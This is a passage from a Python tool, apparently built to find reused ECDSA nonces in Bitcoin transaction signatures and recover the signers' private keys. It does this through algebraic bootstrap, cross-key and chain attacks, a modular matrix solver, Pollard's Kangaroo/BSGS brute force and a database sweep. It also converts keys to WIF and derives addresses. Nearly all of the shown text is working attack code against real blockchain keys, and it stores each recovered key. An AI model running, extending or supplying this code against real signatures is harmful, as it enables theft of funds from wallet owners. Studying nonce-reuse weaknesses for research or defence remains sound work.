        x, rem = divmod(x, 58)
        out.append(ALPHA[rem])
    for byte in b:
        if byte == 0: out.append("1")
        else: break
    return "".join(reversed(out))

def priv_to_wif(priv_hex, compressed=True):
    priv = bytes.fromhex("80" + priv_hex)
    if compressed: priv += b"\x01"
    chk = hashlib.sha256(hashlib.sha256(priv).digest()).digest()[:4]
    return base58_encode(priv + chk)

def _is_compressed_pub(pub_hex: str) -> bool:
    """True for 02/03-prefix compressed keys; False for 04-prefix uncompressed."""
    return not (pub_hex.startswith('04') and len(pub_hex) == 130)

def pub_to_addresses(pub_hex: str):
    pub  = bytes.fromhex(pub_hex)
    sha  = hashlib.sha256(pub).digest()
    ripe = calc_ripemd160(sha)
    p2pkh = base58_encode(
        b"\x00" + ripe +
        hashlib.sha256(hashlib.sha256(b"\x00" + ripe).digest()).digest()[:4]
    )
    if not _is_compressed_pub(pub_hex):
        return p2pkh, "", ""
    wp = convertbits(ripe, 8, 5)
    p2wpkh = bech32_encode("bc", [0] + wp) if wp is not None else ""
    redeem = b"\x00\x14" + ripe
    ripe_r = calc_ripemd160(hashlib.sha256(redeem).digest())
    p2sh = base58_encode(
        b"\x05" + ripe_r +
        hashlib.sha256(hashlib.sha256(b"\x05" + ripe_r).digest()).digest()[:4]
    )
    return p2pkh, p2wpkh, p2sh

# ==============================================================================
# PART 15.5: PHASE 4 — CKC DB-WIDE SWEEP
# Catches keys that slip through the file-based engine due to three gaps:
#   Gap 1 — DB orphans: sig sat alone in DB when scanned, r-dup appeared later
#            → SAVED_R_GROUPS never updated, so rnon.txt never held the pair.
#   Gap 2 — z=N/A on one side: file parser skips these; chain recovery from a
#            key already recovered in Phase 1/2 can still unlock the other side.
#   Gap 3 — s₁==s₂: attempt_bootstrap() skips these; sign-flip tries (N-s) variants.
# Runs AFTER Phase 3 so brute-force seeds are available for chain recovery.
# ==============================================================================

def run_ckc_sweep(recovered_db: Dict[str, int],
                  method_map:   Dict[str, str],
                  r_map:        Dict[str, str],
                  stats) -> int:
    """
    Query every r-duplicate in the DB and attempt recovery on missed pairs.
    Returns the count of newly recovered keys.
    """
    print("\n[+] PHASE 4 — CKC DB-WIDE SWEEP (orphans / z=N/A / s1=s2)...")
    r_dups = db_query_r_duplicates()
    sweep_found = 0

    for r_hex_str, _cnt in r_dups:
        r_int = int(r_hex_str, 16)
        group = db_get_sigs_by_r(r_int)
        if len(group) < 2:
            continue

        # Organise by pubkey
        by_pub: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
        for item in group:
            pk = item.get("pubkey")
            if pk and pk != "N/A":
                by_pub[pk].append(item)

        # ── Gap 1 + Gap 3: same-key pairs → bootstrap with sign-flip ──────────
        for pub, entries in by_pub.items():
            if pub in recovered_db or len(entries) < 2:
                continue
            recovered_this = False
            pairs_tested = 0
            for i in range(len(entries)):
                if recovered_this or pairs_tested > 100:
                    break
                a = entries[i]
                z_a, s_a = a.get("z_original"), a.get("s")
                if z_a is None or s_a is None:
                    continue
                for j in range(i + 1, len(entries)):
                    if pairs_tested > 100:
                        break
                    pairs_tested += 1
                    b = entries[j]
                    z_b, s_b = b.get("z_original"), b.get("s")
                    if z_b is None or s_b is None:
                        continue
                    # Try all sign combinations (handles Gap 3: s_a == s_b case)
                    for _sa in [s_a, N - s_a]:
                        for _sb in [s_b, N - s_b]:
                            if _sa == _sb:
                                continue
                            try:
                                k = ((z_a - z_b) * modinv(_sa - _sb, N)) % N
                                d = ((_sa * k - z_a) * modinv(r_int, N)) % N
                                if verify_key(pub, d):
                                    recovered_db[pub] = d
                                    method_map[pub]   = "ckc_sweep_bootstrap"
                                    r_map[pub]        = r_hex_str
                                    stats["ckc_sweep"] += 1
                                    sweep_found       += 1
                                    recovered_this     = True
                                    print(f"   [CKC-SWEEP/BOOTSTRAP] {pub[:22]}... "
                                          f"(Gap {'3' if s_a == s_b else '1'} catch)")
                            except ValueError:
                                pass
                    if recovered_this:
                        break

        # ── Gap 2: z=N/A on target side — chain from already-recovered key ────
        # Re-scan after bootstrap above so freshly recovered keys can seed chains
        tgt_attempts = defaultdict(int)
        for src_pub, src_entries in by_pub.items():
            if src_pub not in recovered_db:
                continue
            d_known = recovered_db[src_pub]
            src_tested = 0
            for src_entry in src_entries:
                if src_tested > 3: break
                s_k, z_k = src_entry.get("s"), src_entry.get("z_original")
                if s_k is None or z_k is None:
                    continue
                src_tested += 1
                for tgt_pub, tgt_entries in by_pub.items():
                    if tgt_pub == src_pub or tgt_pub in recovered_db:
                        continue
                    if tgt_attempts[tgt_pub] > 3:
                        continue
                    tgt_tested = 0
                    for tgt_entry in tgt_entries:
                        if tgt_tested > 3: break
                        s_t, z_t = tgt_entry.get("s"), tgt_entry.get("z_original")
                        if s_t is None or z_t is None:
                            continue   # truly missing z — cannot recover without it
                        tgt_tested += 1
                        tgt_attempts[tgt_pub] += 1
                        for d in attempt_chain(r_int, s_k, z_k, d_known, s_t, z_t):
                            if verify_key(tgt_pub, d):
                                recovered_db[tgt_pub] = d
                                method_map[tgt_pub]   = "ckc_sweep_chain"
                                r_map[tgt_pub]        = r_hex_str
                                stats["ckc_sweep"] += 1
                                sweep_found          += 1
                                print(f"   [CKC-SWEEP/CHAIN]     {tgt_pub[:22]}... "
                                      f"(Gap 2 chain from {src_pub[:14]}...)")
                                break
                        if tgt_pub in recovered_db:
                            break

    print(f"   CKC sweep complete — {sweep_found} additional key(s) recovered.")
    return sweep_found

# ==============================================================================
# PART 14.5: MATRIX SOLVER + KANGAROO + RECOVERY HEURISTICS  (from recover.py)
# ==============================================================================

def solve_linear_system_mod_N(matrix: List[List[int]], rhs: List[int]) -> Optional[List[int]]:
    """Gaussian elimination over Z/NZ (mod N). Returns solution vector or None."""
    rows = len(matrix)
    cols = len(matrix[0]) if rows > 0 else 0
    aug  = [row[:] + [rhs[i]] for i, row in enumerate(matrix)]
    pivot_row = 0
    for c in range(cols):
        pivot = -1
        for rr in range(pivot_row, rows):
            if aug[rr][c] != 0:
                pivot = rr; break
        if pivot == -1: continue
        aug[pivot_row], aug[pivot] = aug[pivot], aug[pivot_row]
        try: inv = modinv(aug[pivot_row][c], N)
        except ValueError: return None
        for j in range(c, cols + 1):
            aug[pivot_row][j] = (aug[pivot_row][j] * inv) % N
        for rr in range(pivot_row + 1, rows):
            factor = aug[rr][c]
            if factor != 0:
                for j in range(c, cols + 1):
                    aug[rr][j] = (aug[rr][j] - factor * aug[pivot_row][j]) % N
        pivot_row += 1
    solution: List[Optional[int]] = [None] * cols
    for rr in range(min(cols, rows) - 1, -1, -1):
        lead = next((c for c in range(cols) if aug[rr][c] == 1), -1)
        if lead != -1:
            val = aug[rr][-1]
            for c in range(lead + 1, cols):
                if aug[rr][c] != 0 and solution[c] is not None:
                    val = (val - aug[rr][c] * solution[c]) % N
            solution[lead] = val
    return solution if all(x is not None for x in solution) else None  # type: ignore

def extract_cyclic_graphs(parsed_groups: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Build a union-find graph connecting signatures that share an r value or pubkey.
    Returns connected components that are over-determined (enough to solve a linear
    system for the private keys without requiring a brute-force seed).
    """
    sig_list: List[Dict[str, Any]] = []
    for grp in parsed_groups:
        for s_hex, z_hex, pub in grp["txs"]:
            sig_list.append({"r": grp["r"], "s": int(s_hex, 16),
                              "z": int(z_hex, 16), "pubkey": pub.lower()})

    parent: Dict[int, int] = {}
    def find(i: int) -> int:
        root = i
        while parent.get(root, root) != root: root = parent[root]
        cur = i
        while cur != root:
            nxt = parent.get(cur, cur); parent[cur] = root; cur = nxt
        return root
    def union(i: int, j: int):
        ri, rj = find(i), find(j)
        if ri != rj: parent[ri] = rj

    r_map_idx: Dict[int, List[int]] = defaultdict(list)
    p_map_idx: Dict[str, List[int]] = defaultdict(list)
    for i, sig in enumerate(sig_list):
        r_map_idx[sig["r"]].append(i)
        p_map_idx[sig["pubkey"]].append(i)

    for idxs in r_map_idx.values():
        for i in range(1, len(idxs)): union(idxs[0], idxs[i])
    for idxs in p_map_idx.values():
        for i in range(1, len(idxs)): union(idxs[0], idxs[i])

    components: Dict[int, List[Dict]] = defaultdict(list)
    for i in range(len(sig_list)): components[find(i)].append(sig_list[i])

    graphs = []
    for comp in components.values():
        r_set = list({s["r"] for s in comp})
        p_set = list({s["pubkey"] for s in comp})
        if len(comp) >= len(r_set) + len(p_set):
            graphs.append({"sigs": comp, "r_vars": r_set, "p_vars": p_set})
    return graphs

import itertools as _itertools

def solve_cyclic_graph(graph: Dict[str, Any],
                        recovered_db: Dict[str, int],
                        method_map: Dict[str, str]) -> bool:
    """
    Try all ±s sign combinations to find a consistent linear solution over mod N.
    Caps at 16 sigs to avoid combinatorial explosion (2^16 = 65536 iterations).
    """
    sigs, r_vars, p_vars = graph["sigs"], graph["r_vars"], graph["p_vars"]
    if len(sigs) > 16: return False
    if all(p in recovered_db for p in p_vars): return False

    cols  = len(r_vars) + len(p_vars)
    r_idx = {r: i for i, r in enumerate(r_vars)}
    p_idx = {p: i + len(r_vars) for i, p in enumerate(p_vars)}

    for signs in _itertools.product([1, -1], repeat=len(sigs)):
        matrix = [[0] * cols for _ in range(len(sigs))]
        rhs    = [0] * len(sigs)
        for i, sig in enumerate(sigs):
            s_val = sig["s"] if signs[i] == 1 else N - sig["s"]
            matrix[i][r_idx[sig["r"]]]       = s_val
            matrix[i][p_idx[sig["pubkey"]]]  = (-sig["r"]) % N
            rhs[i] = sig["z"]

        sol = solve_linear_system_mod_N(matrix, rhs)
        if sol:
            temp_rec: Dict[str, int] = {}
            found_all = True
            for p, idx in p_idx.items():
                if p in recovered_db: continue
                d = sol[idx]
                if not verify_key(p, d): found_all = False; break
                temp_rec[p] = d
            if found_all and temp_rec:
                for p, d in temp_rec.items():
                    recovered_db[p] = d
                    method_map[p]   = "matrix_solver"
                    print(f"   [MATRIX-SOLVER] {p[:22]}... (cyclic loop)")
                return True
    return False

def pollards_kangaroo(pub_hex: str, s: int, z: int, r: int, max_k: int) -> Optional[Tuple[int, int]]:
    """
    Pollard's Kangaroo algorithm for discrete log in range [1, max_k].
    Faster than BSGS for very large ranges; complements brute_force_k.
    """
    pub_pt = pub_hex_to_point(pub_hex)
    if pub_pt is None: return None
    try: r_inv = modinv(r, N)
    except ValueError: return None

    gen = curve.generator
    for _s in [s, N - s]:
        A  = (_s * r_inv) % N
        B  = (-z * r_inv) % N
        AG = A * gen

        a, b = 1, max_k
        w = b - a
        if w <= 0: continue

        k_jumps   = 16
        mean_jump = max(1, math.isqrt(w) // 2)
        jump_dist = [int(mean_jump * (1.5 ** (i % 4))) for i in range(k_jumps)]
        jump_pt   = [d * AG for d in jump_dist]

        def pseudo(pt: Any) -> int:
            return pt.x() % k_jumps

        # Tame kangaroo starts at b
        tame_d, tame_pt = b, b * AG
        for _ in range(math.isqrt(w) * 2):
            idx = pseudo(tame_pt); tame_d += jump_dist[idx]; tame_pt += jump_pt[idx]

        # Wild kangaroo starts at target
        neg_B    = (N - B) % N
        wild_pt  = pub_pt + (neg_B * gen)
        wild_d   = 0
        for _ in range(math.isqrt(w) * 3):
            idx = pseudo(wild_pt); wild_d += jump_dist[idx]; wild_pt += jump_pt[idx]
            if wild_pt == tame_pt:
                found_k = tame_d - wild_d
                if a <= found_k <= b:
                    d_cand = (A * found_k + B) % N
                    if d_cand > 0 and verify_key(pub_hex, d_cand):
                        return found_k, d_cand
                break
    return None




# ==============================================================================
# PART 14.8: RNON.TXT PARSER  (Phase 1 + 2 data source)
# ==============================================================================

def parse_rnon_file(filepath: str) -> List[Dict[str, Any]]:
    """
    Parse rnon.txt into the parsed_groups format used by Phase 1 (algebraic)
    and Phase 2 (matrix solver).

    Phase 1+2 intentionally read from the FILE rather than from the DB directly.
    This lets the user inspect / trim rnon.txt before running recovery, and it
    keeps the algebraic engine working even when DB_CONN is None.

    Format parsed:
        ================...
        Reused Nonce Group
        ================...
        r: <r_hex>
        Occurrences:
         - txid=<txid> s=<s_hex> z=<z_hex> pubkey=<pubkey>
         ...

    Returns list of {"r": int, "txs": [...], "partial": [...]} dicts.
    txs   = entries where both s and z are valid hex  (usable for algebra)
    partial = entries where z is N/A                  (chain context only)
    """
    groups: List[Dict[str, Any]] = []
    if not os.path.isfile(filepath):
        print(f"[parse] File not found: {filepath}")
        return groups

    current_r:       Optional[int]            = None
    current_txs:     List[Tuple[str,str,str]] = []
    current_partial: List[Tuple[str,None,str]]= []

    def _flush():
        if current_r is not None and (current_txs or current_partial):
            groups.append({
                "r":       current_r,
                "txs":     list(current_txs),
                "partial": list(current_partial),
            })

    with open(filepath, encoding="utf-8", errors="replace") as fh:
        for raw in fh:
            line = raw.rstrip()
            if line.startswith("r: "):
                _flush()
                try:
                    r_hex = line[3:].strip().lstrip("0") or "0"
                    current_r = int(r_hex, 16)
                except ValueError:
                    current_r = None
                current_txs     = []
                current_partial = []
            elif line.lstrip().startswith("- txid="):
                if current_r is None:
                    continue
                # Parse key=value tokens on the line
                tok: Dict[str, str] = {}
                for part in line.split():
                    if "=" in part:
                        k, v = part.split("=", 1)
                        tok[k] = v
                s_hex = tok.get("s", "")
                z_hex = tok.get("z", "")
                pub   = tok.get("pubkey", "N/A")
                # Validate hex fields
                def _is_hex(h: str) -> bool:
                    try: int(h, 16); return bool(h)
                    except ValueError: return False
                if pub and pub != "N/A" and _is_hex(s_hex):
                    if _is_hex(z_hex):
                        current_txs.append((s_hex, z_hex, pub))
                    else:
                        current_partial.append((s_hex, None, pub))  # type: ignore[arg-type]

    _flush()

    # Deduplicate txs within each group (same txid/s/z/pub can appear twice if
    # db_sweep wrote a group and save_rnonce also wrote it in the same session)
    for g in groups:
        seen: set = set()
        deduped = []
        for entry in g["txs"]:
            key = entry[0] + entry[1] + entry[2]   # s+z+pub
            if key not in seen:
                seen.add(key)
                deduped.append(entry)
        g["txs"] = deduped

    valid = sum(1 for g in groups if len(g["txs"]) >= 2)
    print(f"[parse] {len(groups)} group(s) parsed from {filepath} "
          f"({valid} with 2+ usable sigs, "
          f"{len(groups)-valid} partial/single-sig).")
    return groups


# ==============================================================================
# PART 14.9: FULL DB → FILE REBUILD  (runs at recovery start)
# ==============================================================================

def rebuild_files_from_db():
    """
    BUG FIX: Completely regenerate rnon.txt AND rnonce.txt from scratch by
    reading the ENTIRE signatures table.

    Previous behaviour (append-only + written_r_groups gate) had four failure modes:
      1. Cross-session groups — written_r_groups table cleared each run, so groups
         from previous sessions were never re-checked; new entries added to an old r
         group in a later session were never flushed to the files.
      2. Stale file data — if an entry's z was NULL at scan time but patched later,
         the file still showed z=N/A and recovery skipped it.
      3. Missing groups — a group whose only two entries were written in two separate
         sessions never appeared in rnon.txt at all (each session saw count<2 at
         write time; the second session's written_r_groups table was empty but the sweep
         only saw its own new sigs).
      4. Performance guard short-circuit — _NEW_SIGS_SINCE_SWEEP==0 guard could
         prevent the final sweep from running when no new sigs were inserted in the
         current session (pure recovery run on pre-existing DB).

    Fix: wipe both files and written_r_groups table, then write every r-group fresh.
    """
    global SAVED_R_GROUPS
    if DB_CONN is None:
        print("[rebuild] No DB connection — skipping file rebuild.")
        return

    # ── Full DB sweep ──────────────────────────────────────────────────────────
    r_dups = db_query_r_duplicates()
    if not r_dups:
        print("[rebuild] No reused-r groups found in DB — nothing to write.")
        return

    print(f"[rebuild] Regenerating {OUTPUT_R_NON} and {OUTPUT_R_NONCE} "
          f"from {len(r_dups)} reused-r group(s) in DB...")

    # Reset tracking so nothing is skipped
    _wrg_clear()
    SAVED_R_GROUPS   = defaultdict(list)

    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # Open both files for WRITE (not append) — full rebuild
    with open(OUTPUT_R_NON,   "w", encoding="utf-8") as f_non, \
         open(OUTPUT_R_NONCE, "w", encoding="utf-8") as f_nonce:

        written = 0
        for r_hex_str, raw_count in r_dups:
            r_int = int(r_hex_str, 16)
            group = db_get_sigs_by_r(r_int)

            # Deduplicate by (txid, vin_idx, signer_idx)
            seen_occ: set = set()
            deduped = []
            for item in group:
                occ_key = (item.get("txid",""), item.get("vin_idx",0),
                           item.get("signer_idx",0))
                if occ_key not in seen_occ:
                    seen_occ.add(occ_key)
                    deduped.append(item)

            # Need at least 2 distinct occurrences to be a reuse group
            if len(deduped) < 2:
                continue

            # ── rnon.txt (machine-readable, used by recovery parser) ──────────
            f_non.write("=" * 80 + "\n")
            f_non.write("Reused Nonce Group\n")
            f_non.write("=" * 80 + "\n")
            f_non.write(f"r: {r_hex_str}\n")
            f_non.write("Occurrences:\n")
            for item in deduped:
                txid  = item.get("txid", "N/A")
                pk    = item.get("pubkey") or "N/A"
                s_val = item.get("s")
                z_val = item.get("z_original")
                s_hex = hex(s_val)[2:] if isinstance(s_val, int) else "N/A"
                z_hex = hex(z_val)[2:] if z_val  is not None     else "N/A"
                f_non.write(f" - txid={txid} s={s_hex} z={z_hex} pubkey={pk}\n")
            f_non.write("\n")

            # ── rnonce.txt (human-readable summary) ───────────────────────────
            f_nonce.write("=" * 80 + "\n")
            f_nonce.write("Reused Nonce Group\n")
            f_nonce.write("=" * 80 + "\n")
            f_nonce.write(f"r: {r_hex_str}\n")
            f_nonce.write("Occurrences:\n")
            for item in deduped:
                txid = item.get("txid", "N/A")
                pk   = item.get("pubkey") or "N/A"
                f_nonce.write(f" - txid={txid} pubkey={pk}\n")
            f_nonce.write("\n")

            # Mark as written so append-paths later in the session don't duplicate
            _wrg_add(r_hex_str)
            _wrg_add(f"rnon:{r_hex_str}")
            written += 1

    print(f"[rebuild] Done — {written} group(s) written to both files.")


# ==============================================================================
# PART 15: RECOVERY ENGINE
# ==============================================================================

def run_recovery(input_file: str, brute_max_k: int = 0):
    global IN_RECOVERY
    IN_RECOVERY = True

    # ── STEP 0: Fully rebuild both output files from the DB before anything else.
    # This ensures rnon.txt / rnonce.txt always reflect the COMPLETE DB state,
    # catching groups that span multiple sessions or had z=NULL at scan time.
    rebuild_files_from_db()

    # ── STEP 1: Parse rnon.txt → data source for Phase 1 + Phase 2 ──────────
    # Phases 1 and 2 (algebraic + matrix solver) work from the file so that:
    #   a) the user can inspect / edit rnon.txt before re-running recovery
    #   b) these phases work even if DB_CONN is unavailable
    # Phase 3+ queries the DB directly for broader coverage.
    print(f"\n[-] Phase 1+2: Loading recovery groups from {input_file}...")
    parsed_groups = parse_rnon_file(input_file)

    total_txs     = sum(len(g["txs"])     for g in parsed_groups)
    total_partial = sum(len(g["partial"]) for g in parsed_groups)
    full_groups   = sum(1 for g in parsed_groups if len(g["txs"]) >= 2)
    print(f"[-] {len(parsed_groups)} group(s) loaded "
          f"({full_groups} fully usable, "
          f"{len(parsed_groups)-full_groups} partial/single-sig).")
    print(f"[-] Total usable sigs: {total_txs}  |  z-missing sigs: {total_partial}")

    # ── Global r-index: r_int -> [(s, z, pub), ...] across ALL groups ─────────
    global_r_index: Dict[int, List[Tuple[int, int, str]]] = defaultdict(list)
    for group in parsed_groups:
        for s_hex, z_hex, pub in group['txs']:
            global_r_index[group['r']].append(
                (int(s_hex, 16), int(z_hex, 16), pub.lower())
            )

    recovered_db: Dict[str, int] = {}
    method_map:   Dict[str, str] = {}
    r_map:        Dict[str, str] = {}
    stats = defaultdict(int)

    print("\n[+] STARTING MASTER WATERFALL RECOVERY LOOP...")
    print("=" * 70)

    # Extract cyclic graphs once (used by matrix solver Phase 2)
    cyclic_graphs = extract_cyclic_graphs(parsed_groups)
    print(f"[-] {len(cyclic_graphs)} cyclic graph(s) identified for matrix solver.")

    # ── Master loop: Phase 1 (algebraic) + Phase 2 (matrix)
    # Loops until equilibrium — no new keys found in a full pass.
    master_iteration = 0

    while True:
        master_iteration += 1
        keys_before = len(recovered_db)
        print(f"\n--- Master Pass {master_iteration}  (keys banked: {keys_before}) ---")

        # ── Phase 1: Algebraic recovery (bootstrap / cross-key / chain) ─────
        # Source: rnon.txt (parsed_groups)
        found_something = True
        iteration = 0
        while found_something:
            iteration      += 1
            found_something = False
            print(f"  [>] Phase 1 algebraic pass {iteration}")

            for group in parsed_groups:
                r         = group['r']
                txs       = group['txs']
                r_hex_str = hex(r)[2:]

                pub_map: Dict[str, List[Tuple[int, int]]] = {}
                for s_hex, z_hex, pub in txs:
                    pub = pub.lower()
                    s_i, z_i = int(s_hex, 16), int(z_hex, 16)
                    if pub not in pub_map:
                        pub_map[pub] = []
                    if (s_i, z_i) not in pub_map[pub]:
                        pub_map[pub].append((s_i, z_i))

                # ── 1a. Bootstrap: same pubkey, >=2 (s,z) pairs ──────────────────
                for pub, entries in pub_map.items():
                    if pub in recovered_db or len(entries) < 2:
                        continue
                    pairs_tested = 0
                    for i in range(len(entries)):
                        if pub in recovered_db or pairs_tested > 100: break
                        for j in range(i + 1, len(entries)):
                            if pairs_tested > 100: break
                            pairs_tested += 1
                            s1, z1 = entries[i]
                            s2, z2 = entries[j]
                            for d in attempt_bootstrap(r, s1, z1, s2, z2):
                                if verify_key(pub, d):
                                    recovered_db[pub] = d
                                    method_map[pub]   = "bootstrap"
                                    r_map[pub]        = r_hex_str
                                    stats["bootstrap"] += 1
                                    print(f"   [BOOTSTRAP]     {pub[:22]}...")
                                    found_something = True
                                    break
                            if pub in recovered_db: break

                # ── 1b. Complementary nonce: s1 + s2 == N ────────────────────────
                for pub, entries in pub_map.items():
                    if pub in recovered_db or len(entries) < 2:
                        continue
                    pairs_tested = 0
                    for i in range(len(entries)):
                        if pub in recovered_db or pairs_tested > 1000: break
                        for j in range(i + 1, len(entries)):
                            if pairs_tested > 1000: break
                            s1, z1 = entries[i]
                            s2, z2 = entries[j]
                            if (s1 + s2) % N != 0:
                                continue

                            pairs_tested += 1
                            for d in attempt_complementary_recovery(r, s1, z1, s2, z2):
                                if verify_key(pub, d):
                                    recovered_db[pub] = d
                                    method_map[pub]   = "complementary_nonce"
                                    r_map[pub]        = r_hex_str
                                    stats["complementary"] += 1
                                    print(f"   [COMPLEMENTARY] {pub[:22]}... (k/-k pair)")
                                    found_something = True
                                    break
                            if pub in recovered_db: break

                # ── 1c. Cross-key reuse (Brengel/Rossow RAID 2018) ───────────────
                all_sigs_raw = global_r_index.get(r, [])
                seen_pubs_dedup: Dict[str, Tuple[int, int]] = {}
                for _s, _z, _p in all_sigs_raw:
                    if _p not in seen_pubs_dedup:
                        seen_pubs_dedup[_p] = (_s, _z)
                all_sigs = [(_s, _z, _p) for _p, (_s, _z) in seen_pubs_dedup.items()]

                if len(all_sigs) >= 2 and not all(p in recovered_db for _, _, p in all_sigs):
                    try:
                        r_inv = modinv(r, N)
                    except ValueError:
                        r_inv = None

                    if r_inv is not None:
                        seen_pairs: Set[Tuple[str, str]] = set()
                        found_cross_key = False
                        for i in range(len(all_sigs)):
                            if found_cross_key: break
                            s1, z1, pub1 = all_sigs[i]
                            for j in range(i + 1, len(all_sigs)):
                                if found_cross_key: break
                                s2, z2, pub2 = all_sigs[j]
                                if pub1 == pub2: continue
                                if pub1 in recovered_db and pub2 in recovered_db: continue

                                pair_key = tuple(sorted([pub1, pub2]))
                                if pair_key in seen_pairs: continue
                                seen_pairs.add(pair_key)

                                k_candidates: List[int] = []
                                for _s1 in [s1, N-s1]:
                                    for _s2 in [s2, N-s2]:
                                        if _s1 == _s2: continue
                                        try:
                                            k = ((z1 - z2) * modinv(_s1 - _s2, N)) % N
                                            k_candidates.append(k)
                                        except ValueError:
                                            pass

                                for k in k_candidates:
                                    if found_cross_key: break
                                    if pub1 in recovered_db and pub2 in recovered_db: break
                                    if pub1 not in recovered_db:
                                        for _s1 in [s1, N-s1]:
                                            d1 = ((_s1 * k - z1) * r_inv) % N
                                            if verify_key(pub1, d1):
                                                recovered_db[pub1] = d1
                                                method_map[pub1]   = "cross_key_reuse"
                                                r_map[pub1]        = r_hex_str
                                                stats["cross_key"] += 1
                                                print(f"   [CROSS-KEY]     {pub1[:22]}... (shared r)")
                                                found_something = True
                                                found_cross_key = True
                                                break
                                    if pub2 not in recovered_db:
                                        for _s2o in [s2, N-s2]:
                                            d2 = ((_s2o * k - z2) * r_inv) % N
                                            if verify_key(pub2, d2):
                                                recovered_db[pub2] = d2
                                                method_map[pub2]   = "cross_key_reuse"
                                                r_map[pub2]        = r_hex_str
                                                stats["cross_key"] += 1
                                                print(f"   [CROSS-KEY]     {pub2[:22]}... (shared r)")
                                                found_something = True
                                                found_cross_key = True
                                                break

                # ── 1d. Chain: use a recovered key to unlock others ───────────────
                master = None
                for s, z, p in all_sigs:
                    if p in recovered_db:
                        master = (s, z, recovered_db[p])
                        break

                if not master:
                    for s_hex, z_hex, pub in txs:
                        pub = pub.lower()
                        if pub in recovered_db:
                            master = (int(s_hex, 16), int(z_hex, 16), recovered_db[pub])
                            break

                if master:
                    s_k, z_k, d_k = master
                    for s_t_hex, z_t_hex, pub_t in txs:
                        pub_t = pub_t.lower()
                        if pub_t in recovered_db: continue
                        s_t, z_t = int(s_t_hex, 16), int(z_t_hex, 16)
                        for d in attempt_chain(r, s_k, z_k, d_k, s_t, z_t):
                            if verify_key(pub_t, d):
                                recovered_db[pub_t] = d
                                method_map[pub_t]   = "chain"
                                r_map[pub_t]        = r_hex_str
                                stats["chain"] += 1
                                print(f"   [CHAIN]         {pub_t[:22]}...")
                                found_something = True
                                break

        # ── Phase 2: Cyclic Matrix Solver  (source: rnon.txt) ────────────────
        print(f"  [>] Phase 2: Cyclic Matrix Solver ({len(cyclic_graphs)} graph(s))")
        for g in cyclic_graphs:
            if solve_cyclic_graph(g, recovered_db, method_map):
                stats["matrix_solver"] += 1

        # ── Equilibrium check ────────────────────────────────────────────────
        if len(recovered_db) == keys_before:
            print("  [!] Equilibrium reached — no new keys in this pass.")
            break

    # ── Phase 3: Pollard's Kangaroo + BSGS  (source: FULL DB, skip recovered) ─
    if brute_max_k > 0:
        # PERF FIX: time estimate so user knows what they're in for.
        # BSGS does sqrt(max_k) EC mults for baby-steps + sqrt(max_k) for giant-steps.
        # Kangaroo is faster only for ranges > ~2^26; below that BSGS wins.
        import math as _math
        _bsgs_ops  = int(_math.isqrt(brute_max_k)) * 2
        _use_kang  = brute_max_k > (1 << 26)   # Kangaroo only helps for large ranges
        _est_secs_per_target = _bsgs_ops / 5_000   # ~5k EC mults/sec on Python ecdsa
        print(f"\n[+] PHASE 3: {'Kangaroo + ' if _use_kang else ''}BSGS (range 1 to {brute_max_k:,})...")
        print(f"   Estimated ops per target : {_bsgs_ops:,} EC mults")
        print(f"   Rough time per target    : {_est_secs_per_target:.1f}s  "
              f"(Python ecdsa is ~5k mults/sec — use C lib for speed)")
        print(f"   [DB source] Building target list — skipping already-recovered keys...")

        # Query DB directly for unrecovered targets (broader than rnon.txt).
        # BUG FIX: removed "break after first target per r-group" — that caused
        # only 1 pubkey per r-group to be tested, silently skipping the rest.
        # Now we collect ALL unrecovered pubkeys across ALL r-groups, deduplicated
        # by pubkey so the same key is never tested twice.
        targets: List[Tuple[str, int, int, int, str]] = []   # (r_hex, r, s, z, pub)
        _seen_pubs: set = set()
        db_r_dups = db_query_r_duplicates() if DB_CONN else []
        for r_hex_str, _cnt in db_r_dups:
            grp_r = int(r_hex_str, 16)
            group_items = db_get_sigs_by_r(grp_r)
            for item in group_items:
                pk    = (item.get("pubkey") or "").lower()
                s_val = item.get("s")
                z_val = item.get("z_original")
                if pk and pk != "n/a" and s_val and z_val \
                        and pk not in recovered_db and pk not in _seen_pubs:
                    targets.append((r_hex_str, grp_r, s_val, z_val, pk))
                    _seen_pubs.add(pk)
        print(f"   {len(targets)} unique unrecovered pubkey(s) found across {len(db_r_dups)} r-group(s).")

        if targets:
            print(f"   Testing {len(targets)} group(s)...")
            _t4_start = time.time()
            for _t4_idx, (r_hex_str, grp_r, s, z, pub) in enumerate(targets, 1):
                if pub in recovered_db:
                    continue    # skip if recovered by a previous kangaroo chain
                _elapsed = time.time() - _t4_start
                _avg     = _elapsed / _t4_idx if _t4_idx > 1 else 0
                _eta     = _avg * (len(targets) - _t4_idx + 1)
                print(f"   [{_t4_idx}/{len(targets)}] Testing {pub[:22]}...  "
                      f"elapsed={_elapsed:.0f}s  ETA≈{_eta:.0f}s")
                res = None
                if _use_kang:
                    res = pollards_kangaroo(pub, s, z, grp_r, brute_max_k)
                if not res:
                    res = brute_force_k(grp_r, s, z, pub, brute_max_k)
                if res:
                    k_found, d = res
                    bf_r_hex   = r_hex_str
                    recovered_db[pub] = d
                    method_map[pub]   = "kangaroo"
                    r_map[pub]        = bf_r_hex
                    stats["kangaroo"] += 1
                    print(f"   [KANGAROO] k={k_found:,} -> {pub[:22]}...")
                    try: bf_r_inv = modinv(grp_r, N)
                    except ValueError: continue
                    # Chain: recover all other sigs in this r-group
                    for item in db_get_sigs_by_r(grp_r):
                        pub_t = (item.get("pubkey") or "").lower()
                        s_t   = item.get("s")
                        z_t   = item.get("z_original")
                        if not pub_t or pub_t == "n/a" or pub_t in recovered_db: continue
                        if s_t is None or z_t is None: continue
                        d_t = ((k_found * s_t - z_t) * bf_r_inv) % N
                        if verify_key(pub_t, d_t):
                            recovered_db[pub_t] = d_t
                            method_map[pub_t]   = "kangaroo_chain"
                            r_map[pub_t]        = bf_r_hex
                            stats["kangaroo_chain"] += 1
                            print(f"      +- [KANGAROO-CHAIN] {pub_t[:22]}...")
        else:
            print("   All groups already recovered — Phase 3 skipped.")

    # ── Phase 4: CKC DB-wide sweep — catches orphans, z=N/A, s1=s2 ──────────
    if DB_CONN:
        run_ckc_sweep(recovered_db, method_map, r_map, stats)

    # ── Phase 5: DB Pre-Recovered Integration ────────────────────────────────
    # Load keys found in previous sessions; track separately so stats are honest.
    preloaded = 0
    if DB_CONN:
        cur = DB_CONN.execute("SELECT pubkey, priv_hex, method FROM recovered_keys")
        for pk, priv, method in cur.fetchall():
            if pk not in recovered_db:
